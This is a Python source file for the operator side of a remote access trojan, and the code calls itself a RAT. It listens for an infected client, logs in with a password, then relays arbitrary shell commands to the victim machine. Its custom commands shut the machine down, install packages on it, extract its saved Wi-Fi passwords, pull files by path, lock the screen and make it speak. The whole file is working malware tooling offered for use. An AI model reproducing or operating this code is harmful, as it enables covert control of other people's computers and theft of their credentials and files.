import socket
import subprocess
import sys
import re
import colorama


def imports():
    try:
        import pyttsx3
    except ModuleNotFoundError:
        alr = subprocess.check_output("pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pyttsx3
imports()



class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'

logsuc = "[+] Login Successful"
logfail = "Incorrect"
read = 0
wallow = 0
readallow = 0
os = ""

privateIP = socket.gethostbyname(socket.gethostname())
host = str(privateIP)
p = input("Enter Port: ")

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((host, int(p)))
print(bcolors.GREEN + ' #### Listening on port ' + p + '... ' + '####')
listener.listen(0)
conn, addr = listener.accept()
print("[+] Connection established")

def login():
    while True:
        passwd = input("Login: ")
        conn.send(str.encode(passwd))
        lr = str(conn.recv(1024), "utf-8")
        if lr == logsuc:
            print(bcolors.GREEN +
                  '\n\n\n\t\t\t|#############################################|\n'
                  '\t\t\t|        ______________________________       |\n'                                              
                  '\t\t\t|        \______   \  /  _  \__    ___/       |\n'
                  '\t\t\t|          |       _/ /  /_\  \|    |         |\n'                
                  '\t\t\t|          |    |   \/    |    \    |         |\n'                                
                  '\t\t\t|          |____|_  /\____|__  /____|         |\n'  
                  '\t\t\t|                 \/         \/               |\n'                                          
                  '\t\t\t|#############################################|\n\n')




            print(bcolors.GREEN + logsuc)
            print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
            os = str(conn.recv(1024), "utf-8")
            if "win" in os:
                os = "WINDOWS MACHINE"
            elif "mac" in os:
                os = "MAC MACHINE"
            elif "lin" in os:
                os = "LINUX MACHINE"
            elif "ub" in os:
                os = "UBUNTU MACHINE"
            print(bcolors.RED + "########## WARNING!!!! THIS RAT IS MADE FOR WINDOWS SO SOME OF THE CUSTOM COMMANDS MAY NOT WORK ON OTHER OS ##########")
            print(bcolors.YELLOW + "----------------------------------------------------------------------------------------------------------------------")
            print(bcolors.RED + "########## YOUR CLIENT IS USING A " + os + " SO MAKE SURE TO USE COMMANDS THAT WORK ON " + os + " ##########")
            break
        elif lr != logsuc:
            print(bcolors.RED + logfail)

def help():
    print(bcolors.YELLOW + '[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
                           ' to see the clients public IP address\n[+] Type shutdown to shutdown client and type cshutdo'
                           'wn to cancel\n[+] Type wifi pass to get the wifi '
                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak"')



def send_commands():
    global bcolors, wallow
    while True:
        while True:
            cmd = input(">> ")
            lcmd = cmd.lower()
            if cmd != "":
                break

        def download_files():
            conn.send(str.encode(lcmd))
            path = input("Please enter the EXACT file path of the file you would like to download from the client: ")
            conn.send(str.encode(path))
            file_content = str(conn.recv(99999), "utf-8")
            file_content = bytes(file_content, encoding='utf8')
            #############################################
            received_path = input(
                bcolors.GREEN + "File Received! " + "What would you like to name this file: ")
            with open(received_path, "wb") as file:
                file.write(file_content)

        if lcmd == "quit":
            quit()
        if lcmd == "shutdown":
            cmd = "shutdown /s"
        if lcmd == "cshutdown" or lcmd == "c shutdown":
            cmd = "shutdown /a"
        if lcmd == "help":
            help()
        if lcmd == "pipins":
            x=4
            while x==4:
                module = input("What module would you like to install on the client machine? ")
                module = module.lower()
                if module == "quit":
                    quit()
                cmd = "pip install " + module
                x=5
        if "speak " in lcmd:
            conn.send(str.encode(lcmd))
        if lcmd == "wifipass" or lcmd == "wifi pass":
            ex = 0
            while True:
                conn.send(str.encode(lcmd))
                wpass = str(conn.recv(99999), "utf-8")
                if wpass == "something":
                    send_commands()
                if wpass != "None":
                    wpass_r = re.search("(?:='Key\sContent\s*:\s)(.*)", wpass)
                    new_wpass = wpass_r.group(1)
                    final_wpass = new_wpass.replace(r"\r'>", " ")
                    if ex == 0:
                        print(bcolors.GREEN + final_wpass + "Is most likely the password")
                        print(bcolors.YELLOW + "These are some other passwords that were found: ")
                        ex = 1
                    elif ex == 1:
                        print(bcolors.RED + final_wpass)
                        if wpass == "something":
                            wallow = 1
        if lcmd == "lock" or lcmd == "lock ":
            if "win" in os:
                cmd = 'Rundll32.exe user32.dll,LockWorkStation'
            elif "mac" in os:
                cmd = 'pmset displaysleepnow'
            else:
                print("Please note that this command has only been tested for windows and mac os")
                cmd = 'pmset displaysleepnow'

        if lcmd != "email" and lcmd != "help" and "speak " not in lcmd and read == 0 and wallow == 0:
            if lcmd == "download":
                download_files()

            conn.send(str.encode(cmd))
            cmd_response = str(conn.recv(99999), "utf-8")
            print(bcolors.BLUE + cmd_response)
login()
send_commands()